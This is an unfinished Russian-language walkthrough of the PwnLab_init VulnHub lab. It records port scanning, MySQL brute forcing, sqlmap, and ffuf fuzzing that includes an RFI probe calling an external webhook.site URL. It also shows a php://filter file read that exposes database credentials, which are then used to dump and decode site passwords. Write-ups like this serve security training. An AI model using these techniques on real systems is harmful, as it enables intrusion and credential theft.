# VulnHub - Lin Easy - PwnLab_init

📅 Дата: 2025-07-19  
🧠 Сложность:  
💻 IP-адрес: 192.168.56.127  

---

## Sugar

```bash
nmap_ctf() {
  local ip=$1
  sudo nmap -sS -p- -Pn --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
}
```


## 🔍 Сканирование

```bash
export ip=192.168.56.127 && nmap_ctf $ip
```

### nmap  

```bash
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41582/tcp   status
|   100024  1          48227/udp   status
|   100024  1          56507/udp6  status
|_  100024  1          57744/tcp6  status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 40
|   Capabilities flags: 63487
|   Some Capabilities: InteractiveClient, SupportsTransactions, Speaks41ProtocolNew, ConnectWithDatabase, Speaks41ProtocolOld, ODBCClient, IgnoreSigpipes, LongPassword, FoundRows, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsCompression, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: cA[%EjgHp}Bn(v=l*+8t
|_  Auth Plugin Name: mysql_native_password
41582/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:32:5D:1E (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 0.001 days (since Sat Jul 19 22:49:10 2025)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros
```

---

## 🕵️ Enumeration  

### http  
 - `Apache httpd 2.4.10` => поиск exploit
 - `http-title: PwnLab Intranet Image Hosting` => похоже, какой-то фото хостинг, можно загружать файлы

### MySQL  
 - `Version: 5.5.47-0+deb8u1` => поиск exploit  
 - `Salt: cA[%EjgHp}Bn(v=l*+8t` может пригодиться, если получу hash пароля пользователя  
 - `Auth Plugin Name: mysql_native_password` старый метод хеширования (SHA1), уязвим к перебору паролей

Брутфорс пароля **mysql** для пользователя **root** не дал результатов
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Easy - PwnLab_init/exploits]
└─$ hydra -l root -P /media/sf_Exchange/Dictionaries/rockyou.txt mysql://$ip
```

Смотрю сайт, добавил **index.php** => страницы используют **php**  
![http](screenshots/00.http_index.png)
  
Для загрузки файлов необходимо войти в учетную запись  
![http](screenshots/01.http.png)  

Пробую войти с **admin:admin** => **Login failed.**  
Пробую войти с **QwQwiiQ12P:admin** => **Login failed.** => не получится узнать наличие/отсутствие пользователя  

Сохраняю в файл перехваченный запрос на авторизацию, для дальнейшей проверки sqli
```bash
POST /?page=login HTTP/1.1
Host: 192.168.56.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://192.168.56.127
Connection: keep-alive
Referer: http://192.168.56.127/?page=login
Cookie: PHPSESSID=dpnaoluh3rnb68os6qdnm9mr94
Upgrade-Insecure-Requests: 1
Priority: u=0, i

user=admin&pass=admin&submit=Login
```

sqlmap не дал результатов
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Easy - PwnLab_init/exploits]
└─$ sqlmap -r post.txt --dbs --dbms=mysql --random-agent --risk=3 --level=3 --flush-session
```

Фаззинг параметров дал только **page** и не привел к **rfi**
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Easy - PwnLab_init/exploits]
└─$ ffuf -t 100 -u http://$ip/?FUZZ=https://webhook.site/c243a41b-62be-41f2-9d61-5b56bc8e6f5b -w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 332 -ic -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.127/?FUZZ=https://webhook.site/c243a41b-62be-41f2-9d61-5b56bc8e6f5b
 :: Wordlist         : FUZZ: /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 332
________________________________________________

page                    [Status: 200, Size: 265, Words: 17, Lines: 12, Duration: 378ms]
:: Progress: [6453/6453] :: Job [1/1] :: 919 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
```

Фаззинг файлов и директорий дал интересные **images** и **config.php**  
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Easy - PwnLab_init/exploits]
└─$ ffuf -fc 404 -t 40 -u http://$ip/FUZZ -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt -e .php,.txt,.log,.bak -fs 265 -ic -c                           

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.127/FUZZ
 :: Wordlist         : FUZZ: /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .log .bak 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
 :: Filter           : Response size: 265
________________________________________________

login.php               [Status: 200, Size: 250, Words: 16, Lines: 6, Duration: 458ms]
upload.php              [Status: 200, Size: 19, Words: 5, Lines: 1, Duration: 5ms]
upload                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 7ms]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 1288ms]
index.php               [Status: 200, Size: 332, Words: 28, Lines: 12, Duration: 1385ms]
.php                    [Status: 403, Size: 293, Words: 22, Lines: 12, Duration: 1942ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 25ms]
server-status           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 289ms]
```

Фаззинг на **LFI** через аргумент параметра не дал результатов  
```bash
ffuf -fc 404 -t 100 -u http://$ip/?page=FUZZ -w /media/sf_Exchange/Dictionaries/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -fs 265 -ic -c
```

Фаззинг файлов с помощью **php://filter/convert.base64-encode/resource=** дал результаты для `index` без `.php`.  
Вероятно, сервер дописывает `.php` к аргументу, передаваемому параметру `?page=`
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Easy - PwnLab_init/exploits]
└─$ ffuf -fc 404 -t 40 -u http://$ip/index.php?page=php://filter/convert.base64-encode/resource=FUZZ -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt -e .php,.txt,.log,.bak -fs 265 -ic -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.127/index.php?page=php://filter/convert.base64-encode/resource=FUZZ
 :: Wordlist         : FUZZ: /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .log .bak 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 265
 :: Filter           : Response status: 404
________________________________________________

login                   [Status: 200, Size: 1377, Words: 17, Lines: 12, Duration: 9ms]
index                   [Status: 200, Size: 1097, Words: 17, Lines: 12, Duration: 880ms]
upload                  [Status: 200, Size: 2053, Words: 17, Lines: 12, Duration: 15ms]
config                  [Status: 200, Size: 405, Words: 17, Lines: 12, Duration: 35ms]
:: Progress: [1102735/1102735] :: Job [1/1] :: 1123 req/sec :: Duration: [0:22:34] :: Errors: 0 ::
```

`%00` не работает для отбрасывания расширения, так что пробую читать содержимое доступных файлов

### login.php
Использование `prepare` и `bind_param` защищает от SQL-инъекции, так как входные данные экранируются
```php
<?php
session_start();
require("config.php");
$mysqli = new mysqli($server, $username, $password, $database);

if (isset($_POST['user']) and isset($_POST['pass']))
{
	$luser = $_POST['user'];
	$lpass = base64_encode($_POST['pass']);

	$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
	$stmt->bind_param('ss', $luser, $lpass);

	$stmt->execute();
	$stmt->store_Result();

	if ($stmt->num_rows == 1)
	{
		$_SESSION['user'] = $luser;
		header('Location: ?page=upload');
	}
	else
	{
		echo "Login failed.";
	}
}
else
{
	?>
	<form action="" method="POST">
	<label>Username: </label><input id="user" type="test" name="user"><br />
	<label>Password: </label><input id="pass" type="password" name="pass"><br />
	<input type="submit" name="submit" value="Login">
	</form>
	<?php
}
```

### upload.php
Прямой загрузки реверс-шелла через `upload.php` без авторизации не получится, так как проверка `$_SESSION['user']` блокирует доступ
```php
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<?php 
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}

?>
```

### config.php
```php
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

Вначале пробую подключиться к **mysql** и осмотреться там, потом буду пробовать загрузить реверс шелл
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Easy - PwnLab_init/exploits]
└─$ mysql -h 192.168.56.127 -u root -p'H4u%QJ_H99' -D Users
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Easy - PwnLab_init/exploits]
└─$ mysql -h 192.168.56.127 -u root -p'H4u%QJ_H99' -D Users --ssl-mode=DISABLED
mysql: unknown variable 'ssl-mode=DISABLED'
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Easy - PwnLab_init/exploits]
└─$ mysql -h 192.168.56.127 -u root -p'H4u%QJ_H99' -D Users --ssl=0            
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 386311
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [Users]> 
```

В mysql не густо
```mysql
MySQL [Users]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.004 sec)

MySQL [Users]> SHOW TABLES;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.003 sec)

MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.078 sec)

MySQL [Users]> 
```

Похоже, что пароли закодированы в base64  
```
+------+------------+
| user | pass       |
+------+------------+
| kent | JWzXuBJJNy |
| mike | SIfdsTEn6I |
| kane | iSv5Ym2GRo |
+------+------------+
```

`root:H4u%QJ_H99` не подходит для аутентификации на сайте, вошел как `kent:JWzXuBJJNy`  

Загружаю **png** файл размером 95 байт, чтобы посмотреть запрос.
Загруженный файл отображается в `/uploads`
![upload](screenshots/02.upload.png)




## 📂 Получение доступа



## ⚙️ Привилегии



## 🏁 Флаги

- User flag: 
- Root flag: 

---

## 📋 Резюме

🧰 **Инструменты:**
  - nmap, ffuf, и др.

🚨 **Уязвимости, которые удалось обнаружить:**  
  - Directory Traversal  
  - RCE через уязвимый скрипт  

🛡 **Советы по защите:**
  - Использовать сложные пароли и ограничить число попыток входа
  - Обновлять ПО до актуальных версий
  - Удалять/ограничивать использование SUID-бинарников
  - Настроить логирование и мониторинг системных событий
  - Применять принцип наименьших привилегий


